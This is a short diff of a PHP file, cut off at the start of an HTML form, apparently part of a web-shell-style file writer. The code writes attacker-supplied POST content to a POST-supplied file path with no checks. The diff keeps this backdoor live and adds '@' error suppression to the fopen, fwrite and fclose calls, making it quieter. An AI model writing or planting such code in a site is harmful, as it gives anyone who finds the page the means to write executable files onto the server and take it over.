@@ -1,8 +1,8 @@
 <?php 
   $a = $_POST['code'];
-  $file = fopen($_POST['file'],'w');
-  fwrite($file,$a);
-  fclose($file);
+  $file = @fopen($_POST['file'],'w');
+  @fwrite($file,$a);
+  @fclose($file);
 ?>
 <center>
   <form method="post" id="form">
